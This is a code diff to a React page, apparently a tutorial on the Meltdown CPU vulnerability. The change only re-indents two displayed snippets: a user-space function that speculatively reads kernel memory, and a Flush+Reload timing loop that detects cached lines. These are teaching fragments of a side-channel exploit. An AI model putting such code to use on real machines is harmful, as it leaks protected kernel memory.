@@ -108,9 +108,9 @@ class Meltdown extends React.Component{
                   Consider the following piece of code that is executed by a user-level process: <br></br></p>
                   <div className="code">
                     void meltdown_asm(unsigned long kernel_data_addr)&#123; <br></br>
-                    char kernel_data = 0;<br></br>
-                    kernel_data = *(char*)kernel_data_addr; // Line 1. Illegal access, no permission <br></br>
-                    array[kernel_data*4096+DELTA] += 1; // Line 2. Speculatively executed <br></br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;char kernel_data = 0;<br></br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;kernel_data = *(char*)kernel_data_addr; // Line 1. Illegal access, no permission <br></br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;array[kernel_data*4096+DELTA] += 1; // Line 2. Speculatively executed <br></br>
                     &#125;
                   </div>
                   <p>Code 2: Meltdown code <br></br></p>
@@ -134,17 +134,19 @@ class Meltdown extends React.Component{
                   <div className="code">
                     void reloadSideChannel()<br></br>
                     &#123; <br></br>
-                    int junk=0; <br></br>
-                    register uint64_t time1, time2; <br></br>
-                    volatile uint8_t *addr; <br></br>
-                    int i; <br></br>
-                    for&#40;i=0; i&#60;256;i++&#41;&#123; // check which of the 256 cache lines were accessed <br></br>
-                        addr = &array[i*4096 + DELTA]; <br></br>
-                        time1 = __rdtscp(&junk); // calculating the differences in clock cycles <br></br>
-                        junk = *addr; <br></br>
-                        time2 = __rdtscp(&junk) - time1; <br></br>
-                        if &#40;time2 &#60;&#61; CACHE_HIT_THRESHOLD&#41;&#123;  <br></br>
-                    printf&#40;"array[%d*4096 + %d] is in cache.\n", i, DELTA&#41;;<br></br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;int junk=0; <br></br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;register uint64_t time1, time2; <br></br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;volatile uint8_t *addr; <br></br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;int i; <br></br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;for&#40;i=0; i&#60;256;i++&#41;&#123; // check which of the 256 cache lines were accessed <br></br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;addr = &array[i*4096 + DELTA]; <br></br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time1 = __rdtscp(&junk); // calculating the differences in clock cycles <br></br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;junk = *addr; <br></br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time2 = __rdtscp(&junk) - time1; <br></br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if &#40;time2 &#60;&#61; CACHE_HIT_THRESHOLD&#41;&#123;  <br></br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf&#40;"array[%d*4096 + %d] is in cache.\n", i, DELTA&#41;;<br></br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#125;<br></br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&#125;<br></br>
                 &#125;
                   </div>
                   <br></br>
